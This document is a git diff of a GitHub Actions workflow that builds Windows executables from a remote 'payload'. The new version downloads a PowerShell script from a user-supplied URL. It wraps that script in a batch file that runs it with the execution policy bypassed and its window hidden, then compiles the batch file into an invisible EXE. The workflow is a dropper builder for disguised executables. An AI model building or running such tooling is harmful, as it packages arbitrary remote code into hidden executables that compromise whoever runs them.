@@ -1,10 +1,10 @@
-name: Convert JScript to EXE
+name: Convert Batch to EXE
 
 on:
   workflow_dispatch:
     inputs:
       payload_url:
-        description: 'URL to fetch payload.js'
+        description: 'URL to fetch PowerShell script'
         required: true
         type: string
 
@@ -17,34 +17,35 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Fetch the JScript payload
-    - name: Fetch JScript Payload
+    # Step 2: Fetch the PowerShell Payload
+    - name: Fetch PowerShell Payload
       shell: powershell
       run: |
-        Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.js'
-        if (!(Test-Path "payload.js")) { Write-Host "Payload script missing!"; exit 1 }
+        Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
+        if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }
 
-    # Step 3: Create an EXE Wrapper using mshta
-    - name: Create HTA Wrapper
+    # Step 3: Create Embedded Batch File
+    - name: Create Batch Wrapper
       shell: powershell
       run: |
-        Set-Content -Path "payload.hta" -Value @"
-        <script language="JScript">
-        var fso = new ActiveXObject("Scripting.FileSystemObject");
-        var shell = new ActiveXObject("WScript.Shell");
-        shell.Run("cscript.exe //nologo payload.js");
-        </script>
+        Set-Content -Path "payload.bat" -Value @"
+        @echo off
+        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0payload.ps1"
+        exit
         "@
 
-    # Step 4: Convert HTA to EXE using Native SFX
-    - name: Convert HTA to EXE
+    # Step 4: Convert Batch to EXE (Using Bat To Exe Converter)
+    - name: Convert Batch to EXE
       shell: cmd
       run: |
-        copy /b %SystemRoot%\system32\iexpress.exe + payload.hta payload.exe
+        powershell Invoke-WebRequest -Uri "https://f2ko.de/downloads/Bat_To_Exe_Converter.zip" -OutFile "b2e.zip"
+        powershell Expand-Archive -Path "b2e.zip" -DestinationPath "b2e"
+        b2e\Bat_To_Exe_Converter.exe /compile "payload.bat" /saveas "payload.exe" /invisible /embed
 
-    # Step 5: Upload the generated EXE
+    # Step 5: Upload the EXE
     - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
         path: payload.exe
+
